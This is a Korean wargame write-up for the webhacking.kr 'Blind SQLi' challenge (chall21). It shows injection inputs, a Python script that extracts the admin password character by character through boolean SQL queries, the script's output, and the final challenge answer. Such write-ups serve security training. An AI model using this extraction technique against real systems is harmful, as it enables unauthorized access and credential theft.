# Blind SQLi

id, pw입력란이 있다. 
그냥 막 넣어보니, `login fail`이라고 뜬다.
쿼리문은 다음과 같을 것이다. 

```sql
SELECT user FROM chall21 WHERE id='<인풋1>' and pw='<인풋2>'
```

`id = admin`
`pw = ' or '1` 을 삽입한다. 

```sql
SELECT user FROM chall21 WHERE id='admin' and pw='' or '1' 
```

이때는 쿼리문이 Success가 되고, 출력값은 `wrong password` 이 경고값을 보여준다. 
블라인드라더니, **참거짓을 판별할 요소** 가 있었다.

일단, pw 길이를 알아야한다. 

```
/?id=admin&pw=' or length(pw)>0
```

 위 구문을 넣어서 wrong password가 나오는 것을 확인하고 아래와 같은 코드를 작성한다. 

```python
import requests

cookies={'PHPSESSID':'1uv1k3nmdjkp58kt643v5al23t'}
url = "https://webhacking.kr/challenge/bonus-1/index.php"

pw_length = 0
pw = []

for i in range(40):
    query = f"?id=admin&pw=' or length(pw)={i}%23"
    res = requests.get(url+query, cookies=cookies)
    if res.text.find('wrong password') > 0:
        pw_length = i
        break
print(pw_length)

pw = ''
for i in range(1, pw_length+1):
    for j in range(33, 123): # ! ~ z
        query = f"?id=admin&pw=' or ascii(substr(pw,{i},1))={j}%23"
        res = requests.get(url+query, cookies=cookies)
        if res.text.find('wrong password') > 0:
            pw += chr(j)
            print(pw)
            break
print(f'cracked pw: {pw}')
```

```
5
g
gh
ghe
gher
ghere
cracked pw: ghere
```

이게 답인가 싶지만 답이 아니었다. 
pw의 길이는 5가 아니다. 

왠진 모르겠지만, wrong password가 나오면 break를 했었는데 저걸 없애봤다. 

```python
for i in range(40):
    query = f"?id=admin&pw=' or length(pw)={i}%23"
    res = requests.get(url+query, cookies=cookies)
    if res.text.find('wrong password') > 0:
        pw_length = i
print(pw_length)
```

그리고 나머지는 그대로 해서 다시 돌려봤다. 

길이는 36이 나왔다. 
비번은 ghere_is_no_rest_for_the_white_angel

이때 ghere는 there가 되어야한다. 
pw를 불러올때 알파벳순으로 정렬되어오다보니, t보다 앞서는 g가 먼저나오게 된 것이다. 

따라서 답은 

```
admin
there_is_no_rest_for_the_white_angel
```

> 이제 blind SQLi 문제는 바로바로 풀어내자!!